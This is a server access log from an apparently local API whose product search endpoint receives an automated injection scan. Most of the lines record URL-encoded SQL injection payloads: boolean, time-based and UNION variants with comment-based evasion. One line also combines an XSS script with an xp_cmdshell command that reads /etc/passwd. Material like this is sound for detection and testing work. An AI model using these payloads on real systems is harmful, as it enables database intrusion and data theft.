api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27curvJi%3C%27%22%3EOMuwtO HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4059%3D5204%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27OEtd%27%3D%27OEtd HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6502%3D6502%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27KxPZ%27%3D%27KxPZ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7018%3D7715%2F%2A%2A%2FAND%2F%2A%2A%2F%27hFkN%27%3D%27hFkN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6502%3D6502%2F%2A%2A%2FAND%2F%2A%2A%2F%27tPtM%27%3D%27tPtM HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3834%3D3478%2F%2A%2A%2FAND%2F%2A%2A%2F%282739%3D2739 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6502%3D6502%2F%2A%2A%2FAND%2F%2A%2A%2F%281474%3D1474 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4642%3D9266 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6502%3D6502 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3248%3D5621--%2F%2A%2A%2FkcYO HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6502%3D6502--%2F%2A%2A%2FOWvB HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289099%3D3061%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%28116%2C101%2C115%2C116%2C101%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3061%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1228%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283515%3D3515%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%28116%2C101%2C115%2C116%2C101%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7426%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9126%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28CHAR%28113%2C118%2C113%2C122%2C113%29%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284381%3D4381%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2CCHAR%28113%2C122%2C113%2C98%2C113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F9426%3D1946%2F%2A%2A%2FTHEN%2F%2A%2A%2F9426%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28106%2C113%2C97%2C102%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FRhAB HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F1777%3D1777%2F%2A%2A%2FTHEN%2F%2A%2A%2F1777%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2879%2C119%2C106%2C118%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FBeEQ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F9579%3D4954%2F%2A%2A%2FTHEN%2F%2A%2A%2F9579%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2877%2C80%2C115%2C106%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FYBXz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F1777%3D1777%2F%2A%2A%2FTHEN%2F%2A%2A%2F1777%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2879%2C119%2C106%2C118%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FvpjN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F5446%3D1264%2F%2A%2A%2FTHEN%2F%2A%2A%2F5446%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28106%2C69%2C80%2C103%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FEvIs HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=SELECT%2F%2A%2A%2FCHAR%28113%2C118%2C113%2C122%2C113%29%7C%7C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285950%3D5950%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%7C%7CCHAR%28113%2C122%2C113%2C98%2C113%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=SQLite HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--%2F%2A%2A%2FMNBG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9455%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--%2F%2A%2A%2FFFkl HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FOR%2F%2A%2A%2F3149%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--%2F%2A%2A%2FQZzH HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7352%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FOR%2F%2A%2A%2F5229%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F59%3D59%2F%2A%2A%2FTHEN%2F%2A%2A%2F4314%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2880%2C89%2C108%2C70%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FzAgo HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F59%3D86%2F%2A%2A%2FTHEN%2F%2A%2A%2F5847%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28106%2C113%2C115%2C78%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FMNVq HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F86%3D66%2F%2A%2A%2FTHEN%2F%2A%2A%2F8410%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2888%2C99%2C111%2C72%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FTozN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F66%3D66%2F%2A%2A%2FTHEN%2F%2A%2A%2F1797%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28101%2C90%2C114%2C73%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FXyjn HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F86%2F%2A%2A%2F66%2F%2A%2A%2FTHEN%2F%2A%2A%2F4059%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28112%2C85%2C69%2C117%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FhOlX HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F1726%3D%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F1726%2F%2A%2A%2FTHEN%2F%2A%2A%2F2881%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28120%2C108%2C69%2C117%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FWlwm HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284504%29%3D4504%2F%2A%2A%2FTHEN%2F%2A%2A%2F2809%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2880%2C89%2C66%2C65%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2Fpicp HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F4505%3E4504%2F%2A%2A%2FTHEN%2F%2A%2A%2F2440%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28117%2C67%2C69%2C69%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FhRGT HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos&oIrD=1067%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=4256&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2C%2C%22%28..%29%28%27&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27SswHIb%3C%27%22%3EqZKTqM&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2225%3D8815%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27xoaC%27%3D%27xoaC&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3D7009%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27WVuY%27%3D%27WVuY&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4073%3D4231%2F%2A%2A%2FAND%2F%2A%2A%2F%27vPoN%27%3D%27vPoN&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3D7009%2F%2A%2A%2FAND%2F%2A%2A%2F%27gCyt%27%3D%27gCyt&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1892%3D6091%2F%2A%2A%2FAND%2F%2A%2A%2F%288843%3D8843&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3D7009%2F%2A%2A%2FAND%2F%2A%2A%2F%283795%3D3795&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8333%3D3941&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3D7009&categoria=eletronicos HTTP/1.1
